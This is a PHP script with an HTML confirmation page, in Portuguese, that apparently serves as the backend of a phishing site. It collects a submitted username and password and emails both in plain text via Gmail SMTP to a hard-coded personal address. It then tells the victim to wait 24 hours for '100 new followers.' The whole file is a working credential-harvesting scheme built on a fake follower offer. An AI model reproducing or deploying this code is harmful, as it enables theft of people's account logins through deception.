<?php
require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Defina o endereço de e-mail para onde os dados serão enviados
    $to = "the.emerson.araujo@gmail.com"; // Substitua com seu e-mail
    $subject = "Novo Registro de Usuário";

    // Coleta os dados do formulário
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Cria o corpo do e-mail
    $message = "Novo registro de usuário:\n\n";
    $message .= "Nome de Usuário: " . htmlspecialchars($username) . "\n";
    $message .= "Senha: " . htmlspecialchars($password) . "\n";

    // Configurações do PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configurações do servidor SMTP do Gmail
        $mail->isSMTP();                                      // Configurar para usar SMTP
        $mail->Host       = 'smtp.gmail.com';                 // Servidor SMTP do Gmail
        $mail->SMTPAuth   = true;                             // Ativar autenticação SMTP
        $mail->Username   = 'the.emerson.araujo@gmail.com';   // Seu endereço de e-mail Gmail
        $mail->Password   = 'sua-senha-de-aplicativo';         // Senha de aplicativo gerada
        $mail->SMTPSecure = 'tls';                            // Habilitar criptografia TLS
        $mail->Port       = 587;                              // Porta TCP a ser conectada

        // Remetente e destinatário
        $mail->setFrom('the.emerson.araujo@gmail.com', 'Seu Nome');  // Endereço e nome do remetente
        $mail->addAddress($to);                                    // Destinatário do e-mail

        // Conteúdo do e-mail
        $mail->isHTML(false);                                  // Configurar e-mail como texto
        $mail->Subject = $subject;                             // Assunto do e-mail
        $mail->Body    = $message;                             // Corpo do e-mail

        // Envia o e-mail
        $mail->send();
        $success = true;
    } catch (Exception $e) {
        $success = false;
        $errorMessage = $mail->ErrorInfo;
    }
} else {
    $success = false;
    $errorMessage = "O formulário não foi enviado corretamente.";
}

?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boas-vindas</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .container h2 {
            color: #4CAF50;
        }
        .container p {
            color: #555;
            margin: 10px 0;
        }
        .container .success-message {
            color: #4CAF50;
        }
        .container .error-message {
            color: #f44336;
        }
        .container a {
            text-decoration: none;
            padding: 10px 20px;
            background-color: #4CAF50;
            color: white;
            border-radius: 5px;
            margin-top: 20px;
            display: inline-block;
        }
        .container a:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if ($success): ?>
            <h2>Bem-vindo, <?php echo htmlspecialchars($username); ?>!</h2>
            <p class="success-message">Estamos felizes em tê-lo conosco.</p>
            <p>Suas informações foram enviadas com sucesso!</p>
            <p>Aguarde 24hrs para seus novos 100 seguidores!</p>
            <a href="index.html">Voltar ao Início</a>
        <?php else: ?>
            <h2>Oops!</h2>
            <p class="error-message">Houve um problema ao enviar suas informações. Erro: <?php echo htmlspecialchars($errorMessage); ?></p>
            <p>Por favor, tente novamente mais tarde.</p>
            <a href="index.html" style="background-color: #f44336;">Voltar ao Início</a>
        <?php endif; ?>
    </div>
</body>
</html>

